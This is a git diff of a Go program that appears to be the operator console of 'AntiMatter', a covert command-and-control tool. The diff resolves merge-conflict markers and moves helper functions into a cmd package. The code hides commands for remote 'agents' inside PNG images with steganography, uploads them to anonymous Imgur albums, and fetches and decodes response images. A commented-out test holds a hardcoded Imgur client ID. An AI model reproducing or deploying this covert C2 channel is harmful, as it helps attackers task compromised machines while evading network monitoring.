@@ -1,4 +1,3 @@
-<<<<<<< HEAD
 // TODO:
 // Error handling
 // Display walkthroughs for each module
@@ -6,13 +5,10 @@
 // Fix some of the verbiage on the modules so that it makes a bit more sense
 // Maybe some autocomplete and up arrow stuff
 
-=======
->>>>>>> 4be4cb844c6d5152dab1ab87a153868fbb6323bb
 package main
 
 import (
 	"bufio"
-<<<<<<< HEAD
 	"encoding/base64"
 	"errors"
 	"fmt"
@@ -25,51 +21,11 @@ import (
 	"strings"
 
 	"github.com/AntiMatter/cmd"
-=======
-	"bytes"
-	"encoding/base64"
-	"encoding/json"
-	"errors"
-	"fmt"
-	"image/png"
-	"io"
-	"io/ioutil"
-	"log"
-	"mime/multipart"
-	"net/http"
-	"net/url"
-	"os"
-	"reflect"
-	"sort"
-	"strconv"
-	"strings"
-
-	stego "github.com/auyer/steganography"
->>>>>>> 4be4cb844c6d5152dab1ab87a153868fbb6323bb
 	"github.com/fatih/color"
 	"github.com/jwangsadinata/go-multimap/slicemultimap"
 	"github.com/manifoldco/promptui"
 )
 
-<<<<<<< HEAD
-=======
-/*
-// Album is a type to handle the album creation
-type Album struct {
-	deleteHash string
-	albumID    string
-}
-*/
-
-// AlbumImages is a struct to hold the relevant image info after uploading to an album
-type AlbumImages struct {
-	ImageID     string `json:"id"`
-	ImageTitle  string `json:"title"`
-	Description string `json:"description"`
-	ImageLink   string `json:"link"`
-}
-
->>>>>>> 4be4cb844c6d5152dab1ab87a153868fbb6323bb
 // validateOptions is a function that just helps check to make sure you're choosing a correct option
 func validateOptions(slice []string, val string) bool {
 	for _, item := range slice {
@@ -95,193 +51,6 @@ var responseOptions = map[string]string{"AlbumID": "", "ClientID": ""}
 // Global multimap for holding several different types of variables returned from the imgur API
 var imgurItems = slicemultimap.New() // empty
 
-<<<<<<< HEAD
-=======
-// createImage is a function that uses the stego lib to encode an image you define and then write it to a new image
-func createImage(command string, origPic string, newPic string) {
-	inFile, _ := os.Open(origPic)
-	reader := bufio.NewReader(inFile)
-	img, _ := png.Decode(reader)
-
-	w := new(bytes.Buffer)
-	err := stego.Encode(w, img, []byte(command))
-	if err != nil {
-		fmt.Printf("Error encoding file %v", err)
-	} else {
-		fmt.Println(color.GreenString("\n[+]"), "Success creating encoded image!\n")
-
-	}
-
-	outFile, _ := os.Create(newPic)
-	w.WriteTo(outFile)
-	outFile.Close()
-
-}
-
-// createAlbum queries the Imgur API in order to create an anonymous album, using a client ID
-func createAlbum(title string, clientID string) (albumID, deleteHash interface{}) {
-
-	apiURL := "https://api.imgur.com"
-	resource := "/3/album/"
-	data := url.Values{}
-	data.Set("title", title)
-
-	u, _ := url.ParseRequestURI(apiURL)
-	u.Path = resource
-	urlStr := u.String() // "https://api.com/user/"
-
-	client := &http.Client{}
-	r, _ := http.NewRequest("POST", urlStr, strings.NewReader(data.Encode())) // URL-encoded payload
-	r.Header.Add("Authorization", "Client-ID "+clientID)
-	r.Header.Add("Content-Type", "application/x-www-form-urlencoded")
-	r.Header.Add("Content-Length", strconv.Itoa(len(data.Encode())))
-
-	resp, _ := client.Do(r)
-	var result map[string]interface{}
-
-	json.NewDecoder(resp.Body).Decode(&result)
-
-	nestedMap := result["data"]
-	newMap, _ := nestedMap.(map[string]interface{})
-
-	albumID = newMap["id"]
-	deleteHash = newMap["deletehash"]
-
-	fmt.Println(color.GreenString("\n[+]"), "Successfully created an album with the following values:")
-	fmt.Println(color.GreenString("albumID:"), albumID, color.GreenString("Album DeleteHash:"), deleteHash, "\n")
-
-	return albumID, deleteHash
-
-}
-
-func uploadImage(imageFile string, title string, album string, description string, clientID string) (imageID, deleteHash interface{}) {
-	url := "https://api.imgur.com/3/image"
-	method := "POST"
-	var params = map[string]string{"image": imageFile, "title": title, "album": album, "description": description}
-
-	payload := &bytes.Buffer{}
-	writer := multipart.NewWriter(payload)
-
-	// This for loop is to send multiple multipart parameters, that are mapped above
-	for key, val := range params {
-		_ = writer.WriteField(key, val)
-	}
-
-	err := writer.Close()
-	if err != nil {
-		fmt.Println(err)
-	}
-
-	client := &http.Client{}
-	req, err := http.NewRequest(method, url, payload)
-
-	if err != nil {
-		fmt.Println(err)
-	}
-	req.Header.Add("Authorization", "Client-ID "+clientID)
-
-	req.Header.Set("Content-Type", writer.FormDataContentType())
-	res, err := client.Do(req)
-	var result map[string]interface{}
-
-	json.NewDecoder(res.Body).Decode(&result)
-
-	nestedMap := result["data"]
-	newMap, _ := nestedMap.(map[string]interface{})
-
-	imageID = newMap["id"]
-	deleteHash = newMap["deletehash"]
-
-	fmt.Println(color.GreenString("[+] Tasking upload success!"))
-	fmt.Println(color.GreenString("\nTask Image ID is:"), imageID, "|", color.GreenString("Task Image DeleteHash is:"), deleteHash, "\n")
-
-	return imageID, deleteHash
-
-}
-
-func addImage(albumDeleteHash string, clientID string, imgDeleteHash string) (success, status interface{}) {
-	// THis hash is the album deleteHash
-	url := "https://api.imgur.com/3/album/" + albumDeleteHash
-	method := "POST"
-
-	payload := &bytes.Buffer{}
-	writer := multipart.NewWriter(payload)
-	// This hash is the image deleteHash
-	_ = writer.WriteField("deletehashes[]", imgDeleteHash)
-	err := writer.Close()
-	if err != nil {
-		fmt.Println(err)
-	}
-
-	client := &http.Client{}
-	req, err := http.NewRequest(method, url, payload)
-
-	if err != nil {
-		fmt.Println(err)
-	}
-	req.Header.Add("Authorization", "Client-ID "+clientID)
-
-	req.Header.Set("Content-Type", writer.FormDataContentType())
-	res, err := client.Do(req)
-	var result map[string]interface{}
-
-	json.NewDecoder(res.Body).Decode(&result)
-
-	success = result["success"]
-	status = result["status"]
-
-	return success, status
-
-}
-
-func getAlbumImages(albumID string, clientID string) (imageLink interface{}) {
-	// This hash is the albumID hash
-	url := "https://api.imgur.com/3/album/" + albumID + "/images"
-	method := "GET"
-
-	payload := &bytes.Buffer{}
-	writer := multipart.NewWriter(payload)
-	err := writer.Close()
-	if err != nil {
-		fmt.Println(err)
-	}
-
-	client := &http.Client{}
-	req, err := http.NewRequest(method, url, payload)
-
-	if err != nil {
-		fmt.Println(err)
-	}
-	req.Header.Add("Authorization", "Client-ID "+clientID)
-
-	req.Header.Set("Content-Type", writer.FormDataContentType())
-	res, err := client.Do(req)
-	defer res.Body.Close()
-	body, err := ioutil.ReadAll(res.Body)
-
-	stripResponse := strings.NewReplacer(`{"data":[`, "", "]", "", ":[", ":0", `"}`, `"`, `\`, "")
-	//Init the AlbumImages struct
-	content := AlbumImages{}
-
-	newResponse := stripResponse.Replace(string(body))
-
-	json.Unmarshal([]byte(newResponse), &content)
-
-	v := reflect.ValueOf(content)
-	typeOfS := v.Type()
-
-	for i := 0; i < v.NumField(); i++ {
-		fmt.Printf("[+] %s: %v\n", typeOfS.Field(i).Name, v.Field(i).Interface())
-	}
-
-	link := v.Field(3).Interface()
-	//fmt.Printf("%+v\n", content)
-
-	return link
-
-}
-
->>>>>>> 4be4cb844c6d5152dab1ab87a153868fbb6323bb
 // yesNo() is just a function that helps ask the user yes or no lmao
 func yesNo() bool {
 	prompt := promptui.Select{
@@ -295,43 +64,9 @@ func yesNo() bool {
 	return result == "Yes"
 }
 
-<<<<<<< HEAD
 func main() {
 	for {
 		options := []string{"Options", "Image", "Album", "Agent", "Task", "List", "Delete", "Response", "Exit", "Quit", "Init"}
-=======
-func getImage() bool {
-	prompt := promptui.Select{
-		Label: "Would you like to upload most recently created image to this album?[Yes/No]",
-		Items: []string{"Yes", "No"},
-	}
-	_, result, err := prompt.Run()
-	if err != nil {
-		log.Fatalf("Prompt failed %v\n", err)
-	}
-	return result == "Yes"
-}
-
-func decodeImage() {
-	inFile, _ := os.Open("cool.png")
-	defer inFile.Close()
-
-	reader := bufio.NewReader(inFile)
-	img, _ := png.Decode(reader)
-
-	sizeOfMessage := stego.GetMessageSizeFromImage(img)
-
-	msg := stego.Decode(sizeOfMessage, img)
-	fmt.Println(string(msg))
-}
-
-// This is a mess, defines way too much. Defines everything needed for the promptui
-// Defines different options to choose for an operator
-// Handles the user defined varibles and stores them in a global map
-func main() {
-	for {
-		options := []string{"Options", "Image", "Album", "Agent", "Task", "List", "Delete", "Response", "Exit", "Quit", "testHttp"}
->>>>>>> 4be4cb844c6d5152dab1ab87a153868fbb6323bb
 		validate := func(input string) error {
 			// _, err := strconv.ParseFloat(input, 64)
 			found := validateOptions(options, input)
@@ -352,11 +87,7 @@ func main() {
 		}
 
 		prompt := promptui.Prompt{
-<<<<<<< HEAD
 			Label:     "AntiMatter >>",
-=======
-			Label:     "AntiMatter >",
->>>>>>> 4be4cb844c6d5152dab1ab87a153868fbb6323bb
 			Templates: templates,
 			Validate:  validate,
 		}
@@ -374,21 +105,14 @@ func main() {
 			fmt.Println("")
 			fmt.Println("Valid Commands		Description")
 			fmt.Println("---------------         ------------") // Literally just aethetic
-<<<<<<< HEAD
 			fmt.Println(" ")
-=======
-			fmt.Println("\n")
->>>>>>> 4be4cb844c6d5152dab1ab87a153868fbb6323bb
 			fmt.Println(" Image		Create an Image for agent tasking")
 			fmt.Println(" Album		Create an Album for agent responses")
 			fmt.Println(" Task		Create Tasking for agent")
 			fmt.Println(" List		List images, albums, agents, and tasks")
 			fmt.Println(" Response	Search for any pending responses within an album")
 			fmt.Println(" Options	List out different options/modules you can choose from")
-<<<<<<< HEAD
 			fmt.Println(" Init		Have the server walk you through filling in the options you need")
-=======
->>>>>>> 4be4cb844c6d5152dab1ab87a153868fbb6323bb
 			fmt.Println(" Exit		Exit program")
 			fmt.Println("")
 		}
@@ -401,23 +125,13 @@ func main() {
 			for {
 				reader := bufio.NewReader(os.Stdin)
 				color.Set(color.FgGreen)
-<<<<<<< HEAD
 				fmt.Print("AntiMatter/Image >> ")
-=======
-				fmt.Print("AntiMatter/Image > ")
->>>>>>> 4be4cb844c6d5152dab1ab87a153868fbb6323bb
 				color.Unset()
 				text, _ := reader.ReadString('\n')
 
 				if strings.TrimRight(text, "\n") == "options" {
 					fmt.Println("\n---OPTIONS---")
 					// Check to see if this value is set from the Album module
-<<<<<<< HEAD
-=======
-					//if val, ok := albumOptions["Client-ID"]; ok {
-					//		imageOptions["ClientID"] = val
-					//	}
->>>>>>> 4be4cb844c6d5152dab1ab87a153868fbb6323bb
 					if val, ok := albumOptions["AlbumID"]; ok {
 						imageOptions["AlbumID"] = val
 					}
@@ -432,11 +146,8 @@ func main() {
 					}
 					fmt.Println("\n")
 				} else if strings.Contains(text, "set") {
-<<<<<<< HEAD
 
 					// TODO: If this isn't set it breaks, handle that
-=======
->>>>>>> 4be4cb844c6d5152dab1ab87a153868fbb6323bb
 					if strings.Contains(text, "command") {
 						command := strings.Split(text, "command ")
 						imageOptions["Command"] = strings.Replace(strings.Join(command[1:], ""), "\n", "", -1)
@@ -444,7 +155,6 @@ func main() {
 					} else if strings.Contains(text, "base-image") {
 						baseImage := strings.Split(text, "base-image ")
 						imageOptions["BaseImage"] = strings.Replace(strings.Join(baseImage[1:], ""), "\n", "", -1)
-<<<<<<< HEAD
 
 					} else if strings.Contains(text, "new-filename") {
 						newFilename := strings.Split(text, "new-filename ")
@@ -454,25 +164,13 @@ func main() {
 						clientID := strings.Split(text, "client-id ")
 						imageOptions["ClientID"] = strings.Replace(strings.Join(clientID[1:], ""), "\n", "", -1)
 
-=======
-					} else if strings.Contains(text, "new-filename") {
-						newFilename := strings.Split(text, "new-filename ")
-						imageOptions["NewFilename"] = strings.Replace(strings.Join(newFilename[1:], ""), "\n", "", -1)
-					} else if strings.Contains(text, "client-id") {
-						clientID := strings.Split(text, "client-id ")
-						imageOptions["ClientID"] = strings.Replace(strings.Join(clientID[1:], ""), "\n", "", -1)
->>>>>>> 4be4cb844c6d5152dab1ab87a153868fbb6323bb
 					} else if strings.Contains(text, "album-id") {
 						albumID := strings.Split(text, "album-id ")
 						imageOptions["AlbumID"] = strings.Replace(strings.Join(albumID[1:], ""), "\n", "", -1)
 					}
 
 				} else if strings.Contains(text, "go") {
-<<<<<<< HEAD
 					cmd.CreateImage(imageOptions["Command"], imageOptions["BaseImage"], imageOptions["NewFilename"])
-=======
-					createImage(imageOptions["Command"], imageOptions["BaseImage"], imageOptions["NewFilename"])
->>>>>>> 4be4cb844c6d5152dab1ab87a153868fbb6323bb
 
 				} else if strings.Contains(text, "exit") {
 					break
@@ -480,17 +178,6 @@ func main() {
 
 			}
 		}
-<<<<<<< HEAD
-=======
-		/*
-			if strings.EqualFold(result, "testHttp") {
-				albumID, deleteHash := createAlbum("test", "bc8c890066d6157")
-				fmt.Println(color.GreenString("[+]"), "Successfully created an album with the following values:")
-				fmt.Println(color.GreenString("albumID:"), albumID, color.GreenString("deletehash:"), deleteHash)
-
-			}
-		*/
->>>>>>> 4be4cb844c6d5152dab1ab87a153868fbb6323bb
 
 		if strings.EqualFold(result, "Album") {
 			for {
@@ -545,11 +232,7 @@ func main() {
 					fmt.Println(color.CyanString("AlbumHash:"), albumOptions["Delete-Hash"], "|", color.CyanString("Album ID:"), albumOptions["AlbumID"])
 
 				} else if strings.Contains(text, "go") {
-<<<<<<< HEAD
 					albumID, deletehash := cmd.CreateAlbum(albumOptions["Title"], albumOptions["Client-ID"])
-=======
-					albumID, deletehash := createAlbum(albumOptions["Title"], albumOptions["Client-ID"])
->>>>>>> 4be4cb844c6d5152dab1ab87a153868fbb6323bb
 					albumOptions["AlbumID"] = albumID.(string)
 					albumOptions["Album Delete-Hash"] = deletehash.(string)
 
@@ -563,11 +246,7 @@ func main() {
 		if strings.EqualFold(result, "Task") {
 			for {
 				reader := bufio.NewReader(os.Stdin)
-<<<<<<< HEAD
 				color.Set(color.FgGreen)
-=======
-				color.Set(color.FgHiYellow)
->>>>>>> 4be4cb844c6d5152dab1ab87a153868fbb6323bb
 				fmt.Print("AntiMatter/Task > ")
 				color.Unset()
 				// Had to do this since case sensitivity is dumb in golang
@@ -596,12 +275,6 @@ func main() {
 
 					}
 					fmt.Println("\n")
-<<<<<<< HEAD
-
-=======
-					// var taskOptions = map[string]string{"TaskingImage": "", "Title": "", "Description": "", "ClientID": ""}
-					// func uploadImage(imageFile string, title string, description string, clientID string)
->>>>>>> 4be4cb844c6d5152dab1ab87a153868fbb6323bb
 				} else if strings.Contains(text, "set") {
 					if strings.Contains(text, "title") {
 						taskTitle := strings.Split(text, "title ")
@@ -635,11 +308,7 @@ func main() {
 					}
 
 				} else if strings.Contains(text, "go") {
-<<<<<<< HEAD
 					imageID, deletehash := cmd.UploadImage(taskOptions["TaskingImage"], taskOptions["Title"], taskOptions["AlbumID"], taskOptions["Description"], taskOptions["ClientID"])
-=======
-					imageID, deletehash := uploadImage(taskOptions["TaskingImage"], taskOptions["Title"], taskOptions["AlbumID"], taskOptions["Description"], taskOptions["ClientID"])
->>>>>>> 4be4cb844c6d5152dab1ab87a153868fbb6323bb
 
 					imgurItems.Put("ImageID", imageID)
 					imgurItems.Put("ImageDeleteHash", deletehash)
@@ -648,11 +317,7 @@ func main() {
 
 					confirmAdd := yesNo()
 					if confirmAdd {
-<<<<<<< HEAD
 						cmd.AddImage(albumOptions["Album Delete-Hash"], imageOptions["ClientID"], deletehash.(string))
-=======
-						addImage(albumOptions["Album Delete-Hash"], imageOptions["ClientID"], deletehash.(string))
->>>>>>> 4be4cb844c6d5152dab1ab87a153868fbb6323bb
 						fmt.Println(color.GreenString("[+]"), "Successfully upload image to Album:", albumOptions["Title"])
 					}
 					//fmt.Println(success, "|", status)
@@ -677,15 +342,9 @@ func main() {
 					// Check the lengths to appropriately label values
 					for _, items := range tmp {
 						if len(items) == 15 {
-<<<<<<< HEAD
 							fmt.Println("\n\n", color.GreenString("Image Delete Hash is:"), items)
 						} else if len(items) == 7 {
 							fmt.Println(color.GreenString("Image ID is:"), items, "\n\n")
-=======
-							fmt.Println(color.GreenString("Image Delete Hash is:"), items, "\n")
-						} else if len(items) == 7 {
-							fmt.Println(color.GreenString("\nImage ID is:"), items)
->>>>>>> 4be4cb844c6d5152dab1ab87a153868fbb6323bb
 						}
 					}
 
@@ -745,11 +404,7 @@ func main() {
 					albumID := responseOptions["AlbumID"]
 					clientID := responseOptions["ClientID"]
 
-<<<<<<< HEAD
 					linkImage := cmd.GetAlbumImages(albumID, clientID)
-=======
-					linkImage := getAlbumImages(albumID, clientID)
->>>>>>> 4be4cb844c6d5152dab1ab87a153868fbb6323bb
 
 					response, e := http.Get(linkImage.(string))
 					if e != nil {
@@ -758,10 +413,7 @@ func main() {
 					defer response.Body.Close()
 
 					//open a file for writing
-<<<<<<< HEAD
 					// Should probably have the user define what and where to call this
-=======
->>>>>>> 4be4cb844c6d5152dab1ab87a153868fbb6323bb
 					file, err := os.Create("/tmp/asdf.jpg")
 					if err != nil {
 						log.Fatal(err)
@@ -774,15 +426,9 @@ func main() {
 						log.Fatal(err)
 					}
 					fmt.Println("Get response: Success!\n")
-<<<<<<< HEAD
 					fmt.Println(color.GreenString("Response") + ":\n")
 
 					cmd.DecodeImage()
-=======
-					fmt.Println("Response:\n")
-
-					decodeImage()
->>>>>>> 4be4cb844c6d5152dab1ab87a153868fbb6323bb
 
 				} else if strings.Contains(text, "exit") {
 					break
@@ -790,14 +436,10 @@ func main() {
 			}
 		}
 
-<<<<<<< HEAD
 		if strings.EqualFold(result, "Init") {
 			fmt.Println("Starting the simulation for you...")
 			fmt.Println("This will walk you through the options that you need to get this started")
 
-=======
-		if strings.EqualFold(result, "") {
->>>>>>> 4be4cb844c6d5152dab1ab87a153868fbb6323bb
 		}
 		if strings.EqualFold(result, "") {
 		}
